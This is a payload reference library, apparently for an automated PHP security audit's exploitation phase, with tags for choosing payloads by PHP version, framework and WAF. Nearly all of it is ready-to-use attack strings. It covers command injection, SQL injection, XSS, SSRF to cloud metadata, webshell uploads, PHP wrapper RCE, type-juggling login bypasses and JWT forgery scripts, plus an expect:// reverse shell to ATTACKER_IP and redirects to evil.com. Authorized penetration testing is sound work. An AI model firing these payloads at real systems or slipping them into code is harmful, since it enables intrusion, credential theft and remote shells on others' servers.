# Payload Template Library

Categorized attack payloads for Phase 4 auditor reference. Use with `tools/payload_encoder.php` for encoding variants.

---

## Condition Tag System

Payloads are tagged with applicable environment conditions. Phase-4 experts SHOULD select payloads matching the current environment based on `environment_status.json` detection results, and **skip those that clearly do not apply**.

### Tag Definitions

| Tag | Meaning | Determination Basis |
|-----|---------|-------------------|
| `[PHP5]` | PHP 5.x only | `environment_status.json → php_version < 6.0` |
| `[PHP7+]` | PHP 7.0+ applicable | `php_version >= 7.0` |
| `[PHP74+]` | PHP 7.4+ applicable | `php_version >= 7.4` (FFI available) |
| `[PHP8+]` | PHP 8.0+ applicable | `php_version >= 8.0` (named arguments/Fiber, etc.) |
| `[NoWAF]` | Use only when no WAF present | `waf_detector.php` detected no WAF |
| `[WAF:ModSec]` | ModSecurity-specific bypass | ModSecurity detected |
| `[WAF:Cloudflare]` | Cloudflare-specific bypass | Cloudflare detected |
| `[Laravel]` | Laravel framework specific | `framework == "Laravel"` |
| `[ThinkPHP]` | ThinkPHP framework specific | `framework == "ThinkPHP"` |
| `[WordPress]` | WordPress specific | `framework == "WordPress"` |
| `[Symfony]` | Symfony framework specific | `framework == "Symfony"` |
| `[ALL]` | Universal, applicable to all environments | No conditions |

### Usage Rules

1. **Priority order**: Exact tag match > `[ALL]` universal tag
2. **Skip rule**: On PHP 8.x environments, skip all `[PHP5]`-only payloads (e.g., `%00` truncation)
3. **WAF awareness**: When WAF is detected, skip `[NoWAF]`-tagged simple payloads and use encoded/bypass variants directly
4. **First round strategy**: Without WAF, R1 uses `[NoWAF]` simple payloads for quick confirmation; with WAF, R1 uses encoded payloads directly

---

## RCE Payload

### Command Execution Probes `[ALL]`
```
id
whoami
cat /etc/passwd
echo PROOF_$(date +%s) > /tmp/rce_proof
```

### Command Separators `[ALL]` `[NoWAF]`
```
;id
|id
||id
&id
&&id
`id`
$(id)
%0aid
```

### PHP Code Execution `[ALL]`
```php
phpinfo();
system('id');
echo shell_exec('whoami');
print_r(file_get_contents('/etc/passwd'));
```

### PHP Filter Chain (LFI→RCE) `[ALL]`
```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|convert.base64-decode/resource=php://temp
```

---

## SQL Injection Payload

### Probes `[ALL]` `[NoWAF]`
```sql
'
"
' OR '1'='1
' OR '1'='1'--
1' AND 1=1--
1' AND 1=2--
```

### UNION Injection `[ALL]` `[NoWAF]`
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,version(),3--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
```

### Time-Based Blind `[ALL]`
```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
'; WAITFOR DELAY '00:00:05'--
' AND pg_sleep(5)--
```

### Error-Based Injection `[ALL]`
```sql
' AND extractvalue(1,concat(0x7e,version()))--
' AND updatexml(1,concat(0x7e,version()),1)--
```

---

## XSS Payload

### Basic Tags `[ALL]` `[NoWAF]`
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
```

### Parenthesis-Free Execution `[ALL]`
```html
<img src=x onerror=alert`1`>
<svg onload=location='javascript:alert(1)'>
```

### Encoding Variants `[ALL]`
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

---

## SSRF Payload

### Internal Network Probes
```
http://127.0.0.1/
http://localhost/
http://[::1]/
http://0/
http://2130706433/
http://0x7f000001/
```

### Cloud Metadata
```
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

---

## Deserialization Payload

### PHP Basics
```
O:8:"stdClass":0:{}
O:8:"Exploit":1:{s:3:"cmd";s:2:"id";}
```

### __wakeup Bypass (CVE-2016-7124) `[PHP5]` `[PHP7+]`
```
O:4:"Test":2:{...}  → change to O:4:"Test":3:{...}
```

---

## File Inclusion Payload

### Basic Traversal
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
```

### PHP Protocols
```
php://filter/convert.base64-encode/resource=index.php
php://input (POST body: <?php system('id'); ?>)
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

---

## NoSQL Payload

### MongoDB Operator Injection
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

---

## File Upload Payload

### Extension Bypass `[ALL]`
```
shell.php.jpg
shell.pHp
shell.phtml
shell.php5
shell.phar
shell.php%00.jpg          # [PHP5] null byte truncation, PHP < 5.3.4 only
```

### File Header Spoofing
```
GIF89a<?php system($_GET['cmd']); ?>
```

---

## PHP Type Juggling Payload

Various bypasses caused by PHP weak type comparison (`==`), commonly found in login, password reset, and captcha verification scenarios.

### Magic Hash (MD5 collision with `0e` prefix)

The following strings have MD5 values starting with `0e`; PHP `==` comparison treats them as scientific notation, evaluating to `0`:

```
# MD5 magic hash — mutual == is true
240610708      → md5: 0e462097431906509019562988736854
QNKCDZO        → md5: 0e830400451993494058024219903391
aabg7XSs       → md5: 0e087386482136013740957780965295
aabC9RqS       → md5: 0e041022518165728065344349536617
```

SHA1 likewise:
```
# SHA1 magic hash
aaroZmOk       → sha1: 0e66507019969427134894567494305185566735
aaK1STfY       → sha1: 0e76658526655756207688271159624026011393
```

Usage (login bypass example):
```php
// Vulnerable code: if (md5($input) == md5($stored_password))
// Attack: make both md5 results start with 0e
```

### JSON Integer 0 / Array [] Bypass `[PHP5]`

In PHP, `0 == "any_string"` is `true` (PHP 7 and below); passing an integer via JSON can bypass string comparison:

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username":"admin","password":0}
```

Array bypass (causes certain functions to return `NULL`, and `NULL == false` is true):
```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username":"admin","password":[]}
```

### strcmp Array Bypass `[PHP5]` `[PHP7+]`

`strcmp(array(), "string")` returns `NULL` in PHP < 8.0, and `NULL == 0` is `true` (PHP 8.0+ throws TypeError):

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password[]=xxx
```

```php
// Vulnerable code: if (strcmp($_POST['password'], $real_password) == 0)
// strcmp receives array parameter → returns NULL → NULL == 0 → true → bypass
```

### in_array Loose Comparison Bypass `[ALL]`

`in_array()` uses loose comparison by default; integer `0` equals any string not starting with a digit:

```php
// Vulnerable code
$whitelist = ['admin', 'editor', 'viewer'];
if (in_array(0, $whitelist)) {
    // Always true, because 0 == 'admin' → true
}

// Safe implementation: in_array($input, $whitelist, true)  // third parameter strict=true
```

---

## JWT Attack Payload

Attack payload collection targeting JSON Web Token implementation flaws.

### Algorithm None Attack

Set `alg` to `none` and remove the signature portion to bypass signature verification:

```
# Original JWT header
{"alg":"HS256","typ":"JWT"}

# Tampered header (before base64url encoding)
{"alg":"none","typ":"JWT"}

# Encoded header
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# Complete payload example (note the trailing dot, empty signature)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlciI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.
```

Variants (some libraries are case-sensitive for `none`):
```
"alg": "None"
"alg": "NONE"
"alg": "nOnE"
```

### RS256 → HS256 Algorithm Confusion

Server uses RSA public key for signature verification; attacker changes algorithm to HS256 and signs with the public key as HMAC secret:

```bash
# 1. Obtain target's RSA public key (typically from /jwks.json or /.well-known/jwks.json)
# 2. Use public key as HS256 secret to sign

# python3 example
import jwt
import json

public_key = open('public.pem', 'r').read()

payload = {
    "sub": "1234567890",
    "user": "admin",
    "role": "administrator",
    "iat": 1516239022
}

# Key point: use RSA public key as HS256 secret
token = jwt.encode(payload, public_key, algorithm='HS256')
print(token)
```

### JWK Header Injection

Embed your own JWK public key in the JWT header; if the server trusts the key in the header, it will use the attacker's key for verification:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "<attacker's RSA public key modulus>",
    "e": "AQAB",
    "kid": "attacker-key-1"
  }
}
```

### KID Path Traversal

If the `kid` (Key ID) parameter is used for file reading, path traversal can point to a file with known content:

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../dev/null"
}
```

`/dev/null` has empty content, so the HMAC key is an empty string:
```bash
# Sign with empty string as secret
python3 -c "
import jwt
token = jwt.encode({'user':'admin','role':'admin'}, '', algorithm='HS256')
print(token)
"
```

Other KID traversal paths:
```
"kid": "../../../etc/hostname"
"kid": "../../../proc/sys/kernel/hostname"
"kid": "../../../../../../dev/null"
```

---

## PHP File Inclusion Payload

Advanced exploitation techniques using PHP `include/require` with various protocol streams.

### php://filter Complete Chain

Basic base64 source code reading:
```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../config/database.php
php://filter/convert.base64-encode/resource=/etc/passwd
```

iconv encoding chain (bypass WAF or read binary files):
```
php://filter/convert.iconv.UTF-8.UTF-7/resource=index.php
php://filter/convert.iconv.UTF-8.UTF-16/resource=config.php
php://filter/convert.iconv.UTF-8.CSISO2022KR/resource=index.php
```

zlib compression chain:
```
php://filter/zlib.deflate/convert.base64-encode/resource=index.php
php://filter/zlib.inflate/resource=data:;base64,<compressed_b64_payload>
```

Combined chain (multi-encoding to evade detection):
```
php://filter/convert.iconv.UTF-8.UTF-7|convert.base64-decode|convert.base64-encode/resource=index.php
php://filter/string.rot13/convert.base64-encode/resource=index.php
```

### data:// Protocol RCE `[ALL]`

Embed PHP code directly in URL for execution (requires `allow_url_include=On`; skip when `allow_url_include=Off`):

```
data://text/plain,<?php system($_GET['c']); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
```

Complete HTTP request example:
```http
GET /index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id HTTP/1.1
Host: target.com
```

Common base64 payload reference table:
```
<?php system($_GET['c']); ?>           → PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
<?php phpinfo(); ?>                     → PD9waHAgcGhwaW5mbygpOyA/Pg==
<?php echo file_get_contents('/etc/passwd'); ?> → PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9wYXNzd2QnKTsgPz4=
```

### phar:// Deserialization Trigger `[ALL]`

Trigger PHP deserialization via `phar://` protocol without needing the `unserialize()` function:

```
phar://uploads/avatar.jpg/test.txt
phar://uploads/shell.phar/anything
phar:///tmp/malicious.phar/dummy
```

Trigger points (all of the following functions can trigger phar deserialization):
```php
file_exists('phar://...')
file_get_contents('phar://...')
is_dir('phar://...')
fopen('phar://...')
stat('phar://...')
md5_file('phar://...')
filemtime('phar://...')
```

### expect:// RCE `[ALL]`

Requires the `expect` extension to be installed and enabled (uncommon, but allows direct command execution when present):

```
expect://id
expect://whoami
expect://cat+/etc/passwd
expect://bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'
```

```http
GET /index.php?page=expect://id HTTP/1.1
Host: target.com
```

---

## Open Redirect Bypass Payload

Various bypass techniques for URL redirect allowlist/blocklist validation.

### Protocol-Relative Path Bypass

Exploiting browser behavior with `//`-prefixed URLs:
```
//evil.com
///evil.com
////evil.com
/\/evil.com
/\evil.com
```

### Backslash Bypass

Some servers/frameworks treat `\` as a path separator:
```
\evil.com
\/\/evil.com
/\evil.com
```

### CRLF Injection Redirect

Insert `Location` header via HTTP header injection:
```
%0d%0aLocation:%20http://evil.com
%0d%0aLocation:%0d%0a%0d%0a<script>alert(1)</script>
%E5%98%8A%E5%98%8DLocation:%20http://evil.com
```

URL encoding variants:
```
%0aLocation:%20http://evil.com
%0dLocation:%20http://evil.com
```

### @ Symbol Bypass

Browsers treat the part before `@` as userinfo and actually navigate to the domain after `@`:
```
https://target.com@evil.com
https://target.com%40evil.com
https://target.com:80@evil.com
https://target.com%00@evil.com
```

Complete HTTP request example:
```http
GET /redirect?url=https://target.com@evil.com HTTP/1.1
Host: target.com
```

### Domain Confusion Bypass

Exploiting URL parsing differences and domain concatenation tricks:
```
https://evil.com/.target.com
https://evil.com%23.target.com
https://target.com.evil.com
https://evil.com/target.com
https://evil.com?target.com
https://evil.com#target.com
```

### Special Character / Encoding Bypass

```
/%09/evil.com
/%2fevil.com
/evil%2ecom
/.evil.com
/%68%74%74%70%73%3a%2f%2fevil.com
```

### Comprehensive Exploitation Checklist

```
# Basic tests
/redirect?url=//evil.com
/redirect?url=https://evil.com
/redirect?url=/\evil.com

# @ bypass
/redirect?url=https://target.com@evil.com
/redirect?url=//target.com@evil.com

# Domain confusion
/redirect?url=https://evil.com/.target.com
/redirect?url=https://target.com.evil.com

# Encoding bypass
/redirect?url=%2f%2fevil.com
/redirect?url=https:%2f%2fevil.com
```
